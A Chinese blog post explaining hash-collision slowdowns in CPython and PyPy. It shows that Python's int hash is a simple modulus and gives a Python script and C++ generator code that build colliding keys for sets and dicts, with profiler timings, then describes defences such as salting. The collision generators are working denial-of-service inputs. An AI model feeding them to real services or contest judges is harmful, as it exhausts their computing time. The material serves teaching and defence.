---
title: 浅谈主流 Python 解释器的哈希表实现漏洞
mathjax: true
code_fold: -1
date: "2025-04-01T17:26:43.045073+08:00"
updated: "2025-04-01T17:26:43.541+08:00"
categories:
  - OI
tags:
  - hack
  - hash
---

## 前言

在大多数编程语言中的标准库中，通常会提供**哈希表**的算法实现。但是，一些语言的哈希表实现存在安全漏洞，使得其在业务开发中可能遭到攻击。

本文以 Python 的主流实现为例，分析哈希表被攻击的方法和原理，以及防止攻击的方法。

## 前置知识：哈希表

哈希表是一种通过**键值对映射**实现高效查找的数据结构。其核心思想是将元素存储在固定大小的数组中，并通过哈希函数将键映射到数组索引，理想情况（即期望意义）下插入、查询和删除操作的时间复杂度均为 $\Theta(1)$。

### 核心原理

哈希函数 $f$ 的作用是将任意大小的键映射到有限范围的数组索引 $[0, N)\cap \mathbb{N}$。设计目标包括：

- **高效计算**：计算复杂度需接近 $\Theta(1)$；
- **均匀分布**：尽量减少不同键产生相同索引的概率（即**哈希冲突**）。

### 基本操作

为了方便表述，暂且假定哈希函数为单射（无冲突），则核心操作可以实现为：

1. **插入**：计算 $i=f(k)$，然后将元素 $k$ 存储到数组对应位置；
2. **查询**：计算 $i=f(k)$，定位元素并输出；
3. **删除**：计算 $i=f(k)$，将数组对应位置标记为空。

可以看到，如果 $f$ 可以在 $\Theta(1)$ 的时间内计算，那么元素的插入查询和删除的时间复杂度均为 $\Theta(1)$。

但是，以上的算法仍有两个未解决的的问题，其中第二个问题也就是多数哈希表实现可以被攻击的根源。

### 问题一：存储空间动态扩容

当元素数量达到阈值 $\rho\cdot N$ 时（$\rho$ 为负载因子），进行扩容：

1. 将数组大小扩展为 $\lambda \cdot N$，这里 $\lambda>1$；
2. 将所有元组重新哈希并插入到新表。

容易证明，这种策略可以确保均摊时间复杂度为 $\Theta(1)$；具体地，扩容的时间复杂度可以被均摊到插入操作上，这里不再详细说明。

### 问题二：哈希冲突

上述算法的最大漏洞在于我们假设能够构造一个非常理想的 $f$。

实际上，在实践中，几乎不可能成功构造这样的函数。

那么，如果在尝试插入元素 $x$ 时，发现已经存在 $x'\ne x$ 且 $f(x)=f(x')$，应该如何处理呢？

#### 方法 1：开散列法

在数组的每个位置维护一个链表，若存在冲突元素，只需将它们全部插入到对应链表中。

另一种实现是在数组的每个节点维护一棵红黑树，以达到最差 $\Theta(\log N)$ 的时间复杂度，但这种方法常数时间较劣。

#### 方法 2：闭散列法

这种方法坚持将所有元素直接放在数组中，如果出现元素的哈希值相同，就以特定的法则继续检查。

如果要形式化地表述，可以将上述哈希函数 $f$ 的象换成一个序列，这里不再详细举例。

可以发现，无论是哪一种冲突处理方案，均需要在出现冲突时花费 $\Theta(c)$ 的时间，这里 $c$ 为相同哈希的元素数量。

## 攻击方法 1

在主流的 Python 实现中，数字哈希具有极弱的安全性，具体来讲，它通常实现为

$$
f(x)=x\bmod M
$$

截至本文编写，64 位CPython 和 pypy 的最新版[^1]的整数哈希均将 $M$ 设为 $2^{61}-1$。

这可以在命令行使用 `hash` 函数测试，例如：

```shell
Python 3.13.2 (tags/v3.13.2:4f8bb39, Feb  4 2025, 15:23:48) [MSC v.1942 64 bit (AMD64)] on win32
Type "help", "copyright", "credits" or "license" for more information.
>>> hash(0)
0
>>> hash(1)
1
>>> hash(2)
2
>>> hash(2**64)
8
>>> hash(2**61)
1
>>> hash(2**61-1)
0
>>> hash(2**61-2)
2305843009213693950
>>> hash(2**61-2) == 2**61-2
True
>>>
```

那么，假如我们向哈希表内插入大量不同的 $2^{61}-1$ 的倍数，时间复杂度将达到最劣。

以下是我编写的测试脚本：

```python
import cProfile

n = int(2e4)
m = 2**61 - 1

# 计时
cProfile.run("set(i * 2 for i in range(n))")
cProfile.run("set(i * m for i in range(n))")
```

在 Python 3.13.2 下，输出为[^2]

```plaintext
20004 function calls in 0.006 seconds

   Ordered by: standard name

   ncalls  tottime  percall  cumtime  percall filename:lineno(function)
    20001    0.002    0.000    0.002    0.000 <string>:1(<genexpr>)
        1    0.004    0.004    0.006    0.006 <string>:1(<module>)
        1    0.000    0.000    0.006    0.006 {built-in method builtins.exec}
        1    0.000    0.000    0.000    0.000 {method 'disable' of '_lsprof.Profiler' objects}


         20004 function calls in 2.210 seconds

   Ordered by: standard name

   ncalls  tottime  percall  cumtime  percall filename:lineno(function)
    20001    0.004    0.000    0.004    0.000 <string>:1(<genexpr>)
        1    2.205    2.205    2.209    2.209 <string>:1(<module>)
        1    0.000    0.000    2.210    2.210 {built-in method builtins.exec}
        1    0.000    0.000    0.000    0.000 {method 'disable' of '_lsprof.Profiler' objects}
```

在 pypy 3.11-v7.3.19 下，输出：

```plaintext
20004 function calls in 0.006 seconds

   Ordered by: standard name

   ncalls  tottime  percall  cumtime  percall filename:lineno(function)
    20001    0.003    0.000    0.003    0.000 <string>:1(<genexpr>)
        1    0.003    0.003    0.006    0.006 <string>:1(<module>)
        1    0.000    0.000    0.006    0.006 {built-in function exec}
        1    0.000    0.000    0.000    0.000 {method 'disable' of '_lsprof.Profiler' objects}


         20004 function calls in 4.697 seconds

   Ordered by: standard name

   ncalls  tottime  percall  cumtime  percall filename:lineno(function)
    20001    0.007    0.000    0.007    0.000 <string>:1(<genexpr>)
        1    4.690    4.690    4.697    4.697 <string>:1(<module>)
        1    0.000    0.000    4.697    4.697 {built-in function exec}
        1    0.000    0.000    0.000    0.000 {method 'disable' of '_lsprof.Profiler' objects}
```

可以看到，这种方法有效地增大了算法执行的时间。

实际上，C++ 的哈希表也有类似漏洞，这里不进行分析了。

## 攻击方法 2

如果输入时限制插入的数字大小，我们需要考虑攻击哈希表的寻址策略。

这里只讨论 CPython 实现的 `dict`。

`dict` 的实现策略在其代码注释[^3]中给出，具体来说，哈希表在占用空间达到 $\dfrac{2}{3}$ 时动态扩容，且其大小永远为 $2$ 的幂；`dict` 使用闭散列法，具体的方法用语言表述较繁琐，因此复制其代码[^4]如下：

```cpp
/* Search index of hash table from offset of entry table */
static Py_ssize_t
lookdict_index(PyDictKeysObject *k, Py_hash_t hash, Py_ssize_t index)
{
    size_t mask = DK_MASK(k);
    size_t perturb = (size_t)hash;
    size_t i = (size_t)hash & mask;

    for (;;) {
        Py_ssize_t ix = dictkeys_get_index(k, i);
        if (ix == index) {
            return i;
        }
        if (ix == DKIX_EMPTY) {
            return DKIX_EMPTY;
        }
        perturb >>= PERTURB_SHIFT;
        i = mask & (i*5 + perturb + 1);
    }
    Py_UNREACHABLE();
}
```

这里 `PERTURB_SHIFT` 为常数 $5$。

因此，我们很容易想到，尝试预先把要插入的元素可以放置到的位置尽量占满，这样，可以通过大量的对这一个元素的查询操作使得程序花费大量的时间。

这里是一份尽量构造哈希冲突的 C++ 代码。由于参数较多，若读者希望自行实验，单独改动其中一项参数的值可能不能达到期望结果。这里不对参数的选择进行讨论。

```cpp
#include <cstdint>
#include <iostream>
#include <vector>
using namespace std;

vector<int> collision(size_t M, size_t k) {
  size_t mask = ((size_t)1 << k) - 1;
  int offset = 1 << k;
  size_t ind = offset & mask;
  vector<int> res;
  res.push_back(1 << k);
  while (res.size() < M) {
    offset >>= 5;
    ind = (ind * 5 + 1 + offset) & mask;
    res.push_back(ind);
  }
  return res;
}

int main() {
  size_t N = 100000;
  auto v = collision((1 << 15) + 1, 18);
  while (v.size() < N)
    v.push_back(0);
  for (auto i : v)
    cout << i << '\n';
  return 0;
}
```

测试代码如下：

```python
import cProfile

data1: list[int] = []
data2: list[int] = []

with open("test.txt", "r", encoding="ascii") as file:
    for line in file:
        data1.append(int(line.strip()))
for i in range(len(data1)):
    data2.append(i * 3)

def test_insert(data: list[int]):
    d = {}
    for i in range(len(data)):
        d[data[i]] = i

cProfile.run("test_insert(data1)")
cProfile.run("test_insert(data2)")
```

输出：

```plaintext
5 function calls in 4.445 seconds

   Ordered by: standard name

   ncalls  tottime  percall  cumtime  percall filename:lineno(function)
        1    0.001    0.001    4.445    4.445 <string>:1(<module>)
        1    4.444    4.444    4.444    4.444 dict_test2.py:16(test_insert)
        1    0.000    0.000    4.445    4.445 {built-in method builtins.exec}
        1    0.000    0.000    0.000    0.000 {built-in method builtins.len}
        1    0.000    0.000    0.000    0.000 {method 'disable' of '_lsprof.Profiler' objects}


         5 function calls in 0.012 seconds

   Ordered by: standard name

   ncalls  tottime  percall  cumtime  percall filename:lineno(function)
        1    0.001    0.001    0.012    0.012 <string>:1(<module>)
        1    0.011    0.011    0.011    0.011 dict_test2.py:16(test_insert)
        1    0.000    0.000    0.012    0.012 {built-in method builtins.exec}
        1    0.000    0.000    0.000    0.000 {built-in method builtins.len}
        1    0.000    0.000    0.000    0.000 {method 'disable' of '_lsprof.Profiler' objects}
```

这样的时间差异也已经可以对很多服务造成影响了。

我相信 pypy 同样可以通过类似的方法攻击，这里不展开描述了。

应该指出，可以对哈希表的寻址策略进行攻击的根本原因还是 Python 的数字哈希函数易于猜测。

## 防御攻击

值得一提的是，CPython 设计时并非没有考虑到这类情况，在文档[^5]中，提到：

> 在默认情况下，str 和 bytes 对象的 `__hash__()` 值会使用一个不可预知的随机值“加盐”。 虽然它们在一个单独 Python 进程中会保持不变，但它们的值在重复运行的 Python 间是不可预测的。
>
> 这是为了防止通过精心选择输入来利用字典插入操作在最坏情况下的执行效率即 $O(n^2)$ 复杂度制度的拒绝服务攻击。 请参阅 [http://ocert.org/advisories/ocert-2011-003.html](https://github.com/python/cpython/blob/3.13/Objects/dictobject.c#L289) 了解详情。
>
> 改变哈希值会影响集合的迭代次序。Python 也从不保证这个次序不会被改变（通常它在 32 位和 64 位构建上是不一致的）。

但是，在实现 `int` 的哈希函数时，设计者又认为，在平均（或者说，一般）情况下，直接使用其本身的值的效率更高，因此遗留了这一项漏洞。

幸运的是，如果已经意识到了漏洞，防范其被人利用总是容易的。最简单的方式莫过于将 `int` 强制转换为 `str` 类型。如果有同时存储 `int` 和 `str` 的需求，自行编写一个可以“加盐”的 `int` 类也并不复杂。这里不再给出详细实现。

[^1]: CPython 的版本为 3.13.2，pypy 的版本为 3.11-v7.3.19；下同
[^2]: 测试用机器处理器参数为 11th Gen Intel(R) Core(TM) i5-1135G7 @ 2.40GHz，内存 16 GB
[^3]: https://github.com/python/cpython/blob/3.13/Objects/dictobject.c#L289
[^4]: https://github.com/python/cpython/blob/3.13/Objects/dictobject.c#L1034
[^5]: https://docs.python.org/zh-cn/3.13/reference/datamodel.html#object.__hash__
